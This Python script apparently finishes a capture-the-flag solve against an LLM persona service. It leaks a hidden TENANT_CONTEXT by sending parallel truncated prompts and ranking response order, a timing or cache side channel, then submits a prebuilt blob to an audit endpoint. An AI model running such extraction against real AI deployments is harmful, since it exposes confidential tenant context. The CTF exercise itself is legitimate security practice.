#!/usr/bin/env python3
"""
Finish the recovery on a fresh instance.

1. wait for the brain to answer
2. cheap 6 message truncation probe, to confirm the 12 slots already in
   scratch/state.json still describe this deployment's TENANT_CONTEXT
3. resolve the two open slots I3 and T3 through the ordering channel
4. one audit with the locally built blob

Deliberately gentle on the brain. The previous deployment wedged after a long
run of 21 message batches: node stayed up while uvicorn stopped listening, so
every later call came back 502 "fetch failed" in under a second.
"""
import json
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import requests  # noqa: E402

from solve import GRAMMAR, Pool, audit, load_state, save_state  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SCRATCH = os.path.join(ROOT, "scratch")


def wait_healthy(base, budget=2400):
    """The ingress serves a "TFCCTF Challenge Loading" placeholder until the pod
    is ready. That placeholder answers GET / with 200 and POST with 405, so the
    only honest readiness test is GET /health, which is 404 on the placeholder
    and {"ok":true} on the express front."""
    deadline = time.time() + budget
    while time.time() < deadline:
        try:
            r = requests.get(base + "/health", timeout=25)
            if r.status_code != 200 or "ok" not in r.text:
                print(f"[wait] placeholder, /health {r.status_code}", flush=True)
                time.sleep(10)
                continue
        except Exception as error:  # noqa: BLE001
            print(f"[wait] {error!r}"[:120], flush=True)
            time.sleep(10)
            continue
        try:
            s = requests.Session()
            import secrets
            name = "w" + secrets.token_hex(8)
            r = s.post(base + "/api/accounts",
                       json={"username": name, "password": "hotwater12345"}, timeout=25)
            if r.status_code != 201:
                raise RuntimeError(f"accounts {r.status_code}")
            token = r.json()["session"]
            r = s.post(base + "/api/v1/import",
                       json={"manifest": {"name": "Mira", "capabilities": ["memory.search"]},
                             "memories": [{"text": "p"}], "runtime": {}},
                       headers={"x-soul-session": token}, timeout=60)
            pid = r.json()["id"]
            r = s.post(f"{base}/api/personas/{pid}/chat", json={"message": "hello"},
                       headers={"x-soul-session": token}, timeout=180)
            print(f"[health] {r.status_code} {r.text[:100]}", flush=True)
            if r.status_code == 200:
                return True
        except Exception as error:  # noqa: BLE001
            print(f"[health] {error!r}"[:140], flush=True)
        time.sleep(10)
    return False


def verify_prefix(base, prefix):
    """Six truncations at spread out word counts. If the whole prefix is still a
    prefix of the resident tokens the answers come back strictly longest first."""
    words = prefix.split(" ")
    marks = sorted({8, 16, 24, 32, 44, len(words)})
    parts = [" ".join(words[:m]) for m in marks]
    pool = Pool(base, len(parts))
    order, results = pool.probe(parts)
    seen = []
    for rank, i in enumerate(order):
        wc = len(parts[i].split(" "))
        seen.append(wc)
        print(f"  rank {rank} words={wc:3d} {results[i][1]} {parts[i][-34:]!r}", flush=True)
    good = seen == sorted(seen, reverse=True)
    print(f"[{'+' if good else '!'}] prefix {'CONFIRMED' if good else 'MISMATCH'}: {seen}",
          flush=True)
    return good, pool


def resolve(pool, prefix, candidates, rounds=4):
    messages = [prefix + value for value in candidates]
    winners = []
    for attempt in range(rounds):
        order, results = pool.probe(messages)
        bad = [r for r in results if r[1] != 200]
        if bad:
            print(f"    [!] {len(bad)} non 200, first {bad[0]}", flush=True)
        order = [i for i in order if results[i][1] == 200]
        if not order:
            time.sleep(20)
            continue
        winner = candidates[order[0]]
        gap = results[order[1]][0] - results[order[0]][0] if len(order) > 1 else 0
        print(f"    round {attempt}: {winner!r} gap {gap:.3f}s", flush=True)
        winners.append(winner)
        if len(winners) >= 2 and winners[-1] == winners[-2]:
            return winners[-1]
    if not winners:
        raise RuntimeError("no usable rounds")
    return max({w: winners.count(w) for w in winners}, key=lambda w: winners.count(w))


def main():
    base = sys.argv[1].rstrip("/")
    state = load_state()
    prefix = state["prefix"]
    if not wait_healthy(base):
        print("[!] brain never came up", flush=True)
        return 1
    good, pool = verify_prefix(base, prefix)
    if not good:
        print("[!] different TENANT_CONTEXT on this deployment, full recover from scratch",
              flush=True)
        save_state({})
        from solve import recover as full_recover
        context = full_recover(base)
        state = load_state()
        prefix = state["prefix"]
    elif "I3" not in state["slots"]:
        print("[*] slot I3", flush=True)
        pool.build(len(GRAMMAR["OBJ_INDEF"]))
        i3 = resolve(pool, prefix, GRAMMAR["OBJ_INDEF"])
        state["slots"]["I3"] = i3
        prefix = prefix + i3 + " "
        state["prefix"] = prefix
        save_state(state)
        print(f"[+] I3 = {i3!r}", flush=True)
    else:
        prefix = state["prefix"]

    if "T3" not in state["slots"]:
        print("[*] slot T3", flush=True)
        pool.build(len(GRAMMAR["TIME"]))
        t3 = resolve(pool, prefix, GRAMMAR["TIME"])
        state["slots"]["T3"] = t3
        prefix = prefix + t3 + "."
        state["prefix"] = prefix
        state["context"] = prefix
        save_state(state)
        print(f"[+] T3 = {t3!r}", flush=True)

    context = state["context"]
    print(f"[+] context: {context}", flush=True)
    combos = json.load(open(os.path.join(SCRATCH, "combos99.json")))
    index = next((n for n, c in enumerate(combos) if c["context"] == context), None)
    if index is None:
        print("[!] context not among the 99 prebuilt blobs, building it", flush=True)
        from solve import build_blob
        blob = build_blob(context)
    else:
        dst = os.path.join(SCRATCH, "blobs99", f"{index}.b64")
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        if not os.path.exists(dst):
            subprocess.run(["docker", "cp",
                            f"nohotwater-local:/tmp/blobs99/{index}.b64", dst], check=True)
        blob = open(dst).read().strip()
        print(f"[+] using prebuilt blob {index}", flush=True)
    json.dump({"blob": blob}, open(os.path.join(SCRATCH, "blob.json"), "w"))
    audit(base, blob)
    return 0


if __name__ == "__main__":
    sys.exit(main())
